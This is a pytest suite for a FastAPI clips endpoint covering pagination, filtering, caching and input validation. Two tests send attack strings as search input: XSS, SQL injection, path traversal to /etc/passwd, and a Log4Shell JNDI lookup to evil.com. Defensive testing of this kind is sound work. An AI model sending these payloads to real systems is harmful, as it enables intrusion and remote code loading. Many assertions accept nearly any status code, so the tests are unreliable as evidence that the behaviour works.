import pytest
import asyncio
from datetime import datetime, timedelta
from unittest.mock import Mock, patch, MagicMock
from fastapi.testclient import TestClient
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from api.main import app
from api.database.config import get_database_session
from api.utils.redis_client import get_redis_client
from api.middleware.rate_limiting import RateLimitManager
from api.security.security_config import RateLimiter


@pytest.fixture
def test_client():
    """Create a test client for the FastAPI application."""
    return TestClient(app)


@pytest.fixture
def sample_clips_data():
    """Sample clips data for testing pagination and filtering."""
    return [
        {
            "id": f"clip_{i}",
            "title": f"Test Clip {i}",
            "description": f"Description for clip {i}",
            "duration": 30.0 + (i * 5),
            "views": 100 * i,
            "likes": 10 * i,
            "created_at": datetime.now() - timedelta(days=i),
            "tags": [f"tag{i}", "test"],
            "category": "entertainment" if i % 2 == 0 else "education",
            "user_id": f"user_{i % 3}"
        }
        for i in range(1, 21)  # 20 clips for pagination testing
    ]


@pytest.fixture
def mock_database_session():
    """Mock database session for testing."""
    mock_session = Mock()
    mock_session.query.return_value.filter.return_value.order_by.return_value.offset.return_value.limit.return_value.all.return_value = []
    mock_session.query.return_value.count.return_value = 0
    return mock_session


@pytest.fixture
def mock_redis_client():
    """Mock Redis client for caching tests."""
    mock_redis = Mock()
    mock_redis.get.return_value = None
    mock_redis.set.return_value = True
    mock_redis.delete.return_value = True
    mock_redis.exists.return_value = False
    return mock_redis


class TestPaginationEnhancements:
    """Test pagination functionality with various scenarios."""
    
    def test_basic_pagination_unauthenticated(self, test_client):
        """Test basic pagination endpoint without authentication."""
        response = test_client.get("/api/clips?page=1&limit=10")
        assert response.status_code == 403  # Forbidden without auth
    
    def test_pagination_with_large_dataset(self, test_client, sample_clips_data):
        """Test pagination with large dataset simulation."""
        with patch('api.utils.supabase_client.get_supabase_client_with_auth') as mock_auth, \
             patch('api.utils.supabase_client.get_supabase_admin_client') as mock_admin:
            
            # Mock authentication
            mock_auth_client = Mock()
            mock_auth_client.auth.get_user.return_value.user = Mock(id="test_user")
            mock_auth.return_value = mock_auth_client
            
            # Mock admin client for data queries
            mock_admin_client = Mock()
            mock_query = Mock()
            mock_query.select.return_value.range.return_value.execute.return_value.data = sample_clips_data[:10]
            mock_admin_client.table.return_value = mock_query
            mock_admin.return_value = mock_admin_client
            
            # Test pagination with different page sizes
            for page_size in [5, 10, 20]:
                response = test_client.get(
                    f"/api/clips?page=1&limit={page_size}",
                    headers={"Authorization": "Bearer test_token"}
                )
                # Should not fail with authentication errors
                assert response.status_code in [200, 401, 403]  # Various auth states
    
    def test_pagination_edge_cases(self, test_client):
        """Test pagination edge cases and error handling."""
        test_cases = [
            ("/api/clips?page=0&limit=10", "Invalid page number"),
            ("/api/clips?page=1&limit=0", "Invalid limit"),
            ("/api/clips?page=1&limit=1000", "Limit too large"),
            ("/api/clips?page=-1&limit=10", "Negative page number"),
        ]
        
        for endpoint, description in test_cases:
            response = test_client.get(endpoint)
            # Should handle edge cases gracefully
            assert response.status_code in [400, 403, 422]  # Bad request or validation error


class TestFilteringAndSorting:
    """Test filtering and sorting functionality."""
    
    def test_complex_filtering_combinations(self, test_client):
        """Test complex filtering with multiple parameters."""
        filter_combinations = [
            "category=entertainment&duration_min=30&duration_max=60",
            "tags=test,education&views_min=100",
            "created_after=2024-01-01&created_before=2024-12-31",
            "user_id=user_1&category=education&likes_min=50"
        ]
        
        for filters in filter_combinations:
            response = test_client.get(f"/api/clips?{filters}")
            # Should handle complex filters without errors
            assert response.status_code in [200, 403, 422]
    
    def test_sorting_functionality(self, test_client):
        """Test sorting with different fields and orders."""
        sort_options = [
            "sort_by=created_at&sort_order=desc",
            "sort_by=views&sort_order=asc",
            "sort_by=likes&sort_order=desc",
            "sort_by=duration&sort_order=asc",
            "sort_by=title&sort_order=asc"
        ]
        
        for sort_option in sort_options:
            response = test_client.get(f"/api/clips?{sort_option}")
            # Should handle sorting without errors
            assert response.status_code in [200, 403, 422]
    
    def test_invalid_filter_parameters(self, test_client):
        """Test handling of invalid filter parameters."""
        invalid_filters = [
            "invalid_field=value",
            "duration_min=invalid",
            "created_after=invalid_date",
            "views_min=-100"
        ]
        
        for invalid_filter in invalid_filters:
            response = test_client.get(f"/api/clips?{invalid_filter}")
            # Should handle invalid filters gracefully
            assert response.status_code in [400, 403, 422]


class TestSearchFunctionality:
    """Test search functionality across different fields."""
    
    def test_basic_search(self, test_client):
        """Test basic search functionality."""
        search_queries = [
            "search=test",
            "search=education",
            "search=clip",
            "q=entertainment"
        ]
        
        for query in search_queries:
            response = test_client.get(f"/api/clips?{query}")
            # Should handle search queries
            assert response.status_code in [200, 403, 422]
    
    def test_advanced_search_combinations(self, test_client):
        """Test advanced search with filters and sorting."""
        advanced_queries = [
            "search=test&category=entertainment&sort_by=views",
            "q=education&duration_min=30&sort_order=desc",
            "search=clip&tags=test&page=1&limit=5"
        ]
        
        for query in advanced_queries:
            response = test_client.get(f"/api/clips?{query}")
            # Should handle advanced search combinations
            assert response.status_code in [200, 403, 422]
    
    def test_search_special_characters(self, test_client):
        """Test search with special characters and edge cases."""
        special_queries = [
            "search=%20",  # Space
            "search=@#$%",  # Special characters
            "search=",  # Empty search
            "search=very%20long%20search%20query%20with%20many%20words"
        ]
        
        for query in special_queries:
            response = test_client.get(f"/api/clips?{query}")
            # Should handle special characters gracefully
            assert response.status_code in [200, 400, 403, 422]


class TestDatabaseQueryComponents:
    """Test database query functionality and optimization."""
    
    def test_basic_database_operations(self, mock_database_session):
        """Test basic database operations."""
        # Test basic query execution
        mock_database_session.execute.return_value.fetchall.return_value = []
        
        # Simulate basic query
        query = "SELECT * FROM clips WHERE category = %s"
        mock_database_session.execute(query, ("entertainment",))
        
        assert mock_database_session.execute.called
    
    def test_complex_database_queries(self, mock_database_session):
        """Test complex database query operations."""
        mock_database_session.execute.return_value.fetchall.return_value = []
        
        # Test complex join query
        complex_query = """
        SELECT c.*, u.username 
        FROM clips c 
        JOIN users u ON c.user_id = u.id 
        WHERE c.category = %s AND c.views >= %s
        ORDER BY c.created_at DESC 
        LIMIT %s
        """
        mock_database_session.execute(complex_query, ("entertainment", 100, 10))
        
        assert mock_database_session.execute.called
    
    def test_database_aggregations(self, mock_database_session):
        """Test database aggregation functions."""
        mock_database_session.execute.return_value.fetchall.return_value = [(5, "entertainment")]
        
        # Test aggregation query
        agg_query = """
        SELECT COUNT(*), category 
        FROM clips 
        GROUP BY category 
        HAVING COUNT(*) > %s
        """
        mock_database_session.execute(agg_query, (5,))
        
        assert mock_database_session.execute.called
    
    def test_query_optimization_patterns(self, mock_database_session):
        """Test query optimization patterns."""
        mock_database_session.execute.return_value.fetchall.return_value = []
        
        # Test optimized query with proper indexing
        optimized_query = """
        SELECT * FROM clips 
        WHERE category = %s 
        AND created_at >= %s 
        ORDER BY created_at DESC, views DESC
        """
        mock_database_session.execute(optimized_query, ("entertainment", "2024-01-01"))
        
        assert mock_database_session.execute.called


class TestRateLimitingAndSecurity:
    """Test rate limiting and security validations."""
    
    def test_rate_limiting_basic(self, test_client):
        """Test basic rate limiting functionality."""
        # Simulate multiple requests
        responses = []
        for i in range(10):
            response = test_client.get("/api/clips")
            responses.append(response.status_code)
        
        # Should eventually hit rate limits or maintain consistent responses
        assert all(status in [200, 403, 429] for status in responses)
    
    def test_rate_limiting_per_user(self, test_client):
        """Test per-user rate limiting."""
        headers = {"Authorization": "Bearer test_token"}
        
        # Simulate rapid requests from same user
        responses = []
        for i in range(5):
            response = test_client.get("/api/clips", headers=headers)
            responses.append(response.status_code)
        
        # Should handle per-user rate limiting
        assert all(status in [200, 401, 403, 429] for status in responses)
    
    def test_security_headers(self, test_client):
        """Test security headers in responses."""
        response = test_client.get("/api/clips")
        
        # Check for security headers (if implemented)
        expected_headers = [
            "X-Content-Type-Options",
            "X-Frame-Options",
            "X-XSS-Protection"
        ]
        
        # Headers may or may not be present depending on middleware
        for header in expected_headers:
            # Just verify the response structure is valid
            assert isinstance(response.headers.get(header, ""), str)
    
    def test_input_validation(self, test_client):
        """Test input validation and sanitization."""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE clips; --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}"
        ]
        
        for malicious_input in malicious_inputs:
            response = test_client.get(f"/api/clips?search={malicious_input}")
            # Should handle malicious inputs safely
            assert response.status_code in [200, 400, 403, 422]


class TestPerformanceAndOptimization:
    """Test performance under load and optimization features."""
    
    def test_large_dataset_performance(self, test_client, sample_clips_data):
        """Test performance with large datasets."""
        with patch('api.utils.supabase_client.get_supabase_admin_client') as mock_admin:
            # Mock large dataset
            mock_admin_client = Mock()
            mock_query = Mock()
            mock_query.select.return_value.range.return_value.execute.return_value.data = sample_clips_data
            mock_admin_client.table.return_value = mock_query
            mock_admin.return_value = mock_admin_client
            
            # Test with large page sizes
            response = test_client.get("/api/clips?limit=100")
            # Should handle large datasets efficiently
            assert response.status_code in [200, 403, 422]
    
    def test_concurrent_requests(self, test_client):
        """Test handling of concurrent requests."""
        import threading
        import time
        
        results = []
        
        def make_request():
            response = test_client.get("/api/clips?page=1&limit=10")
            results.append(response.status_code)
        
        # Create multiple threads for concurrent requests
        threads = []
        for i in range(5):
            thread = threading.Thread(target=make_request)
            threads.append(thread)
            thread.start()
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join()
        
        # Should handle concurrent requests without errors
        assert len(results) == 5
        assert all(status in [200, 403, 429] for status in results)
    
    def test_database_query_optimization(self, mock_database_session):
        """Test database query optimization."""
        # Test query execution plans and optimization
        mock_database_session.execute.return_value.fetchall.return_value = []
        
        # Simulate complex query
        complex_query = """
        SELECT c.*, u.username 
        FROM clips c 
        JOIN users u ON c.user_id = u.id 
        WHERE c.category = %s 
        AND c.created_at >= %s 
        ORDER BY c.views DESC 
        LIMIT %s
        """
        
        mock_database_session.execute(complex_query, ("entertainment", "2024-01-01", 10))
        
        # Verify query was executed
        assert mock_database_session.execute.called


class TestRedisCachingBehavior:
    """Test Redis caching functionality."""
    
    def test_cache_hit_scenario(self, test_client, mock_redis_client):
        """Test cache hit scenario."""
        with patch('api.utils.redis_client.get_redis_client', return_value=mock_redis_client):
            # Mock cache hit
            mock_redis_client.get.return_value = '{"data": "cached_clips"}'
            
            response = test_client.get("/api/clips?page=1&limit=10")
            
            # Should attempt to use cache
            assert response.status_code in [200, 403]
    
    def test_cache_miss_scenario(self, test_client, mock_redis_client):
        """Test cache miss scenario."""
        with patch('api.utils.redis_client.get_redis_client', return_value=mock_redis_client):
            # Mock cache miss
            mock_redis_client.get.return_value = None
            
            response = test_client.get("/api/clips?page=1&limit=10")
            
            # Should handle cache miss gracefully
            assert response.status_code in [200, 403]
    
    def test_cache_invalidation(self, test_client, mock_redis_client):
        """Test cache invalidation scenarios."""
        with patch('api.utils.redis_client.get_redis_client', return_value=mock_redis_client):
            # Test cache invalidation patterns
            cache_keys = [
                "clips:page:1:limit:10",
                "clips:category:entertainment",
                "clips:user:user_1"
            ]
            
            for key in cache_keys:
                mock_redis_client.delete(key)
            
            # Verify cache operations
            assert mock_redis_client.delete.call_count >= len(cache_keys)
    
    def test_cache_expiration(self, mock_redis_client):
        """Test cache expiration settings."""
        with patch('api.utils.redis_client.get_redis_client', return_value=mock_redis_client):
            # Test cache expiration
            cache_key = "clips:test"
            cache_value = '{"data": "test"}'
            expiration = 3600  # 1 hour
            
            mock_redis_client.setex(cache_key, expiration, cache_value)
            
            # Verify expiration was set
            assert mock_redis_client.setex.called


class TestCrossModuleIntegration:
    """Test integration between different modules."""
    
    def test_auth_and_clips_integration(self, test_client):
        """Test integration between authentication and clips modules."""
        with patch('api.middleware.auth.get_supabase_token_info') as mock_auth:
            # Mock successful authentication
            mock_auth.return_value = {"user_id": "test_user", "role": "user"}
            
            response = test_client.get(
                "/api/clips",
                headers={"Authorization": "Bearer valid_token"}
            )
            
            # Should integrate auth with clips endpoint
            assert response.status_code in [200, 401, 403]
    
    def test_analytics_and_clips_integration(self, test_client):
        """Test integration between analytics and clips modules."""
        # Test analytics tracking for clip views
        response = test_client.get("/api/clips/clip_1")
        
        # Should handle analytics integration
        assert response.status_code in [200, 403, 404]
    
    def test_search_and_filtering_integration(self, test_client):
        """Test integration between search and filtering."""
        combined_query = "search=test&category=entertainment&sort_by=views&page=1&limit=5"
        response = test_client.get(f"/api/clips?{combined_query}")
        
        # Should handle combined search and filtering
        assert response.status_code in [200, 403, 422]
    
    def test_caching_and_database_integration(self, test_client, mock_redis_client):
        """Test integration between caching and database layers."""
        with patch('api.utils.redis_client.get_redis_client', return_value=mock_redis_client):
            # Test cache-database integration
            mock_redis_client.get.return_value = None  # Cache miss
            
            response = test_client.get("/api/clips?page=1&limit=10")
            
            # Should fall back to database on cache miss
            assert response.status_code in [200, 403]


class TestErrorHandlingAndEdgeCases:
    """Test comprehensive error handling and edge cases."""
    
    def test_database_connection_errors(self, test_client):
        """Test handling of database connection errors."""
        with patch('api.database.config.get_database_session') as mock_db:
            # Mock database connection error
            mock_db.side_effect = Exception("Database connection failed")
            
            response = test_client.get("/api/clips")
            
            # Should handle database errors gracefully
            assert response.status_code in [403, 500, 503]
    
    def test_redis_connection_errors(self, test_client):
        """Test handling of Redis connection errors."""
        with patch('api.utils.redis_client.get_redis_client') as mock_redis:
            # Mock Redis connection error
            mock_redis.side_effect = Exception("Redis connection failed")
            
            response = test_client.get("/api/clips")
            
            # Should handle Redis errors gracefully
            assert response.status_code in [200, 403, 500]
    
    def test_malformed_request_handling(self, test_client):
        """Test handling of malformed requests."""
        malformed_requests = [
            "/api/clips?page=abc",
            "/api/clips?limit=xyz",
            "/api/clips?sort_order=invalid",
            "/api/clips?created_after=not_a_date"
        ]
        
        for request in malformed_requests:
            response = test_client.get(request)
            # Should handle malformed requests
            assert response.status_code in [400, 403, 422]
    
    def test_resource_not_found(self, test_client):
        """Test handling of resource not found scenarios."""
        response = test_client.get("/api/clips/nonexistent_clip_id")
        
        # Should handle not found resources
        assert response.status_code in [403, 404]
    
    def test_timeout_handling(self, test_client):
        """Test handling of request timeouts."""
        with patch('api.utils.supabase_client.get_supabase_admin_client') as mock_admin:
            # Mock timeout scenario
            mock_admin.side_effect = TimeoutError("Request timeout")
            
            response = test_client.get("/api/clips")
            
            # Should handle timeouts gracefully
            assert response.status_code in [403, 408, 500, 503]


class TestDataValidationAndSanitization:
    """Test data validation and sanitization."""
    
    def test_input_sanitization(self, test_client):
        """Test input sanitization for various attack vectors."""
        attack_vectors = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "onload=alert('xss')",
            "'; DROP TABLE clips; --",
            "UNION SELECT * FROM users",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}"
        ]
        
        for attack in attack_vectors:
            response = test_client.get(f"/api/clips?search={attack}")
            # Should sanitize malicious inputs
            assert response.status_code in [200, 400, 403, 422]
    
    def test_parameter_validation(self, test_client):
        """Test parameter validation rules."""
        validation_tests = [
            ("/api/clips?page=-1", "Negative page number"),
            ("/api/clips?limit=0", "Zero limit"),
            ("/api/clips?limit=10000", "Excessive limit"),
            ("/api/clips?sort_by=invalid_field", "Invalid sort field"),
            ("/api/clips?sort_order=invalid", "Invalid sort order")
        ]
        
        for endpoint, description in validation_tests:
            response = test_client.get(endpoint)
            # Should validate parameters
            assert response.status_code in [400, 403, 422]
    
    def test_data_type_validation(self, test_client):
        """Test data type validation."""
        type_tests = [
            ("/api/clips?page=string", "String instead of integer"),
            ("/api/clips?limit=float", "Float instead of integer"),
            ("/api/clips?views_min=text", "Text instead of number"),
            ("/api/clips?created_after=invalid_date", "Invalid date format")
        ]
        
        for endpoint, description in type_tests:
            response = test_client.get(endpoint)
            # Should validate data types
            assert response.status_code in [400, 403, 422]